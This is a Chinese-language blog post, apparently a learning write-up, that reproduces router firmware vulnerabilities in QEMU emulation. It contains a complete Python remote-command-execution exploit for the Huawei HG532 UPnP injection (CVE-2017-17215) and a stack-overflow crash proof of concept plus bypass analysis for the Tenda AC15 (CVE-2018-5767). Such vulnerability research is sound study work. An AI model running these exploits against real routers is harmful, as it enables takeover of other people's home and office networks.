<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>固件安全初识 | ixout's blog</title><meta name="author" content="ixout"><meta name="copyright" content="ixout"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="固件分析">
<meta property="og:type" content="article">
<meta property="og:title" content="固件安全初识">
<meta property="og:url" content="https://ixout.github.io/posts/3834/index.html">
<meta property="og:site_name" content="ixout&#39;s blog">
<meta property="og:description" content="固件分析">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/indeximg.jpg">
<meta property="article:published_time" content="2024-02-29T12:56:59.000Z">
<meta property="article:modified_time" content="2024-05-15T13:20:16.890Z">
<meta property="article:author" content="ixout">
<meta property="article:tag" content="iot">
<meta property="article:tag" content="固件分析">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/indeximg.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ixout.github.io/posts/3834/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '固件安全初识',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-05-15 21:20:16'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/mainColor/heoMainColor.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/poem/poem.css"><link rel="stylesheet" href="/css/footerb.css"><link rel="stylesheet" href="/css/bolang.css"><link rel="stylesheet" href="/css/jzbar.css"><link rel="stylesheet" href="/css/trans.css"><link rel="stylesheet" href="/css/gundongtiao.css"><link rel="stylesheet" href="/css/shubiao.css"><link rel="stylesheet" href="/css/fengche.css"><link rel="stylesheet" href="/css/alitubiao.css"><link rel="stylesheet" href="/css/fps.css"><span id="fps"></span><link rel="stylesheet" href="/css/yituliu.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_3930344_38rvofbfw64.css" media="defer" onload="this.media='all'"><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ixout's blog" type="application/atom+xml">
</head><body><div id="loading-box"><div class="pokeball-back"></div><div class="pokeball-loading"><div class="pokeball" id="pokeball-normal"></div><div class="pokeball" id="pokeball-great"></div><div class="pokeball" id="pokeball-ultra"></div><div class="pokeball" id="pokeball-master"></div><div class="pokeball" id="pokeball-safari"></div></div></div><script async="async">const preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
document.getElementById('loading-box').addEventListener('click',()=> {preloader.endLoading()})
setTimeout(function(){preloader.endLoading();}, 7000);

if (false) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="/css/jzbar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">64</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-hanbao"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-fenlei"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youlian"></i><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-fantuan"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/ixout/picture@main/img/indeximg.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="ixout's blog"><span class="site-name">ixout's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-hanbao"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-fenlei"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youlian"></i><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-fantuan"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">固件安全初识</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-02-29T12:56:59.000Z" title="发表于 2024-02-29 20:56:59">2024-02-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-05-15T13:20:16.890Z" title="更新于 2024-05-15 21:20:16">2024-05-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">9.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>43分钟</span></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>几次比赛遇到了不少固件分析的题目,但之前一直没有接触过,</p>
<p>先从复现一些简单的漏洞开始学起,尽量有个基础的认识</p>
<h1 id="CVE-2017-17215"><a href="#CVE-2017-17215" class="headerlink" title="CVE-2017-17215"></a>CVE-2017-17215</h1><p><a target="_blank" rel="noopener" href="https://research.checkpoint.com/2017/good-zero-day-skiddie/">Check Point团队报告</a>华为 HG532 产品的远程命令执行漏洞(CVE-2017-17215),华为HG532 是一款小型家用和办公用户打造的高速无线路由器。利用原理是利用upnp服务中的注入漏洞实现<u>任意命令执行</u>。</p>
<h2 id="仿真"><a href="#仿真" class="headerlink" title="仿真"></a>仿真</h2><p>使用的固件是HG532eV100R001C01B020_upgrade_packet.bin</p>
<p>获得固件的运行环境</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://people.debian.org/~aurel32/qemu/mips/debian_squeeze_mips_standard.qcow2</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-2.6.32-5-4kc-malta</span><br></pre></td></tr></table></figure>
<p>按照别的大佬所说需要的是这两个版本,至于怎么找到的不知道</p>
<p>创建虚拟网桥，实现虚拟机内部和Ubuntu的连接</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install bridge-utils</span><br><span class="line">sudo brctl addbr Virbr0</span><br><span class="line">sudo ifconfig Virbr0 192.168.153.1/24 up</span><br></pre></td></tr></table></figure>
<p>创建tap接口，名字为tap0，并添加到网桥</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo tunctl -t tap0</span><br><span class="line">sudo ifconfig tap0 192.168.153.11/24 up</span><br><span class="line">sudo brctl addif Virbr0 tap0</span><br></pre></td></tr></table></figure>
<p>qemu启动脚本</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> -netdev tap,<span class="built_in">id</span>=tapnet,ifname=tap0,script=no -device rtl8139,netdev=tapnet -nographic</span><br></pre></td></tr></table></figure>
<p>在启动的虚拟机里面给网卡添加一个IP，使得qemu的虚拟机与外部宿主机互通。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.153.2/24 up</span><br></pre></td></tr></table></figure>
<p>将之前解压出来的squashfs-root文件夹通过scp命令，复制到虚拟机中</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r squashfs-root/ root@192.168.153.2:~/</span><br></pre></td></tr></table></figure>
<p>在虚拟机中挂载dev和proc</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount -o bind /dev ./squashfs-root/dev</span><br><span class="line">mount -t proc /proc ./squashfs-root/proc</span><br></pre></td></tr></table></figure>
<p>启动shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chroot</span> squashfs-root sh</span><br></pre></td></tr></table></figure>
<p>这个终端备用，后面启动服务后，需要重置eth0和br0</p>
<p>通过ssh启动的终端，启动路由器</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.153.2</span><br><span class="line"><span class="built_in">chroot</span> squashfs-root /bin/sh</span><br><span class="line">./bin/upnp</span><br><span class="line">./bin/mic</span><br></pre></td></tr></table></figure>
<p>虚拟机里面的路由器IP发生了变化，ssh连接已经断开，返回之前的虚拟机中的终端。<br>重新更改路由器的IP，以便于外部的Ubuntu登录管理界面</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.153.2/24 up</span><br><span class="line">ifconfig br0 192.168.153.11/24 up</span><br></pre></td></tr></table></figure>
<p>最终浏览器打开</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-03-04_165034.png" alt=""></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote>
<p>Huawei Home Gateway applies the Universal Plug and Play (UPnP) protocol. Via the TR-064 technical report standard, the protocol is widely used in embedded devices to connect seamlessly and simplify the implementation of networks in home and corporate environments.</p>
<p>TR-064 was designed and intended for local network configuration. For example, it allows an engineer to implement basic device configuration, firmware upgrades and more from within the internal network.</p>
<p>In this case though, the TR-064 implementation in the Huawei devices was exposed to WAN through port 37215 (UPnP).</p>
<p>From looking into the UPnP description of the device, it can be seen that it supports a service type named <code>DeviceUpgrade</code>. This service is supposedly carrying out a firmware upgrade action by sending a request to “/ctrlt/DeviceUpgrade_1” (referred to as controlURL ) and is carried out with two elements named <code>NewStatusURL</code> and <code>NewDownloadURL</code>.</p>
<p>The vulnerability allows remote administrators to execute arbitrary commands by injecting shell meta-characters “$()” in the NewStatusURL and NewDownloadURL as can be seen below.</p>
</blockquote>
<p>根据这段内容我们可以知道,漏洞是出现在/bin/upnp服务中,当向37215端口访问<code>/ctrlt/DeviceUpgrade_1</code>路径时,<code>NewStatusURL</code> and <code>NewDownloadURL</code>这两个标签会产生远程命令执行漏洞</p>
<p>ida分析一下upnp程序</p>
<p>搜索字符串<code>NewStatusURL</code>找到对应位置并创建函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-03-04_185722.png" alt=""></p>
<p>这里会利用用户传递的字符串构造一个命令并让<code>system</code>调用</p>
<p>基于shell的特性,如果使用<code>;</code>或者<code>$()</code>便能够做到任意命令执行</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">Authorization = <span class="string">&quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;Authorization&quot;</span>: Authorization&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-----CVE-2017-17215 HUAWEI HG532 RCE-----\n&quot;</span>)</span><br><span class="line">cmd = <span class="built_in">input</span>(<span class="string">&quot;command &gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line">data = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="string">&lt;s:Envelope s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;s:Body&gt;</span></span><br><span class="line"><span class="string">        &lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;NewStatusURL&gt;winmt&lt;/NewStatusURL&gt;</span></span><br><span class="line"><span class="string">            &lt;NewDownloadURL&gt;;<span class="subst">&#123;cmd&#125;</span>;&lt;/NewDownloadURL&gt;</span></span><br><span class="line"><span class="string">        &lt;/u:Upgrade&gt;</span></span><br><span class="line"><span class="string">    &lt;/s:Body&gt;</span></span><br><span class="line"><span class="string">&lt;/s:Envelope&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">r = requests.post(<span class="string">&#x27;http://192.168.192.133:37215/ctrlt/DeviceUpgrade_1&#x27;</span>, headers = headers, data = data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nstatus_code: &quot;</span> + <span class="built_in">str</span>(r.status_code))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + r.text)</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2018-5767"><a href="#CVE-2018-5767" class="headerlink" title="CVE-2018-5767"></a>CVE-2018-5767</h1><p>Tenda-Ac15可以说是一个各种漏洞cve满天飞的固件了,涉及到的漏洞也比较基础</p>
<p>CVE-2018-5767、CVE-2018-18708、CVE-2018-16333、CVE-2020-13392和CVE-2020-10987等,这漏洞是真多</p>
<p>更多可见<a target="_blank" rel="noopener" href="https://www.opencve.io/cve?vendor=tenda&amp;product=ac15_firmware">https://www.opencve.io/cve?vendor=tenda&amp;product=ac15_firmware</a></p>
<p>适合用来初步了解学习</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>通过漏洞报告可以知道漏洞出在/bin/httpd</p>
<p>据CVE的描述以及公开POC的信息，得知溢出点在R7WebsSecurityHandler函数中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">184</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v40 = <span class="built_in">strstr</span>(*(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">184</span>), <span class="string">&quot;password=&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v40 )</span><br><span class="line">    <span class="built_in">sscanf</span>(v40, <span class="string">&quot;%*[^=]=%[^;];*&quot;</span>, v33);</span><br></pre></td></tr></table></figure>
<p>这里解释以下scanf的格式化字符串<code>%*[^=]=%[^;];*</code></p>
<p>在scanf的字符串中<code>*</code>用于指示需要忽略的内容,<code>%</code>用于匹配需要被保存到的变量中的内容</p>
<p>所以这句格式化字符串的意思就是匹配<code>=</code>之后<code>;</code>之前的所有内容到v33变量中</p>
<p>漏洞就出在其没有进行长度检测,可以发生栈溢出</p>
<p>那么如何让程序流程走到这一步?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strncmp</span>(s1, <span class="string">&quot;/public/&quot;</span>, <span class="number">8u</span>)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(s1, <span class="string">&quot;/lang/&quot;</span>, <span class="number">6u</span>)</span><br><span class="line">  &amp;&amp; !<span class="built_in">strstr</span>(s1, <span class="string">&quot;img/main-logo.png&quot;</span>)</span><br><span class="line">  &amp;&amp; !<span class="built_in">strstr</span>(s1, <span class="string">&quot;reasy-ui-1.0.3.js&quot;</span>)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(s1, <span class="string">&quot;/favicon.ico&quot;</span>, <span class="number">0xC</span>u)</span><br><span class="line">  &amp;&amp; *(_DWORD *)(a1 + <span class="number">152</span>)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(s1, <span class="string">&quot;/kns-query&quot;</span>, <span class="number">0xA</span>u)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(s1, <span class="string">&quot;/wdinfo.php&quot;</span>, <span class="number">0xB</span>u)</span><br><span class="line">  &amp;&amp; (<span class="built_in">strlen</span>(s1) != <span class="number">1</span> || *s1 != <span class="number">47</span>)</span><br><span class="line">  &amp;&amp; (<span class="built_in">strncmp</span>(s1, <span class="string">&quot;/goform/telnet&quot;</span>, <span class="number">0xE</span>u) || g_Pass &amp;&amp; <span class="built_in">strcmp</span>(&amp;g_Pass, <span class="string">&quot;YWRtaW4=&quot;</span>))</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(s1, <span class="string">&quot;/goform/fast_setting&quot;</span>, <span class="number">0x14</span>u)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(s1, <span class="string">&quot;/goform/ate&quot;</span>, <span class="number">0xB</span>u)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(s1, <span class="string">&quot;/goform/InsertWhite&quot;</span>, <span class="number">0x13</span>u)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(s1, <span class="string">&quot;/yun_safe.html&quot;</span>, <span class="number">0xE</span>u)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(s1, <span class="string">&quot;/goform/getWanConnectStatus&quot;</span>, <span class="number">0x1B</span>u)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(s1, <span class="string">&quot;/goform/getProduct&quot;</span>, <span class="number">0x12</span>u)</span><br><span class="line">  &amp;&amp; <span class="built_in">strncmp</span>(s1, <span class="string">&quot;/goform/getRebootStatus&quot;</span>, <span class="number">0x17</span>u)</span><br><span class="line">  &amp;&amp; (i &lt;= <span class="number">2</span> || <span class="built_in">strncmp</span>(s1, <span class="string">&quot;/loginerr.html&quot;</span>, <span class="number">0xE</span>u)) )</span><br></pre></td></tr></table></figure>
<p>首先要保证这些条件都满足,然后要有password的header,一个例子</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> url = <span class="string">&quot;http://192.168.2.3/goform/xxx&quot;</span></span><br><span class="line"> cookie = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;password=&quot;</span>+<span class="string">&quot;A&quot;</span>*<span class="number">1000</span>&#125;</span><br><span class="line"> requests.get(url=url, cookies=cookie)</span><br></pre></td></tr></table></figure>
<p>调试一下可以看到确实发生了栈溢出,但是栈溢出导致寄存器中写入了我们填充的字符串，但是并没有覆盖函数返回地址，是从r3取值，并跳转导致的错误。</p>
<p>跟踪发现触发错误的地方位于sub_2C568函数中，跳出这个函数才可以实现缓冲区溢出</p>
<p>查看漏洞点所在的函数，可以发现存在一个绕过这个子函数的地方，只要判断不为真。这段代码寻找“.”号的地址，并通过memcmp函数判断是否为“gif、png、js、css、jpg、jpeg”字符串。比如存在“.png”内容时，memcmp(v44, “png”, 3u)的返回值为0，if语句将失败。</p>
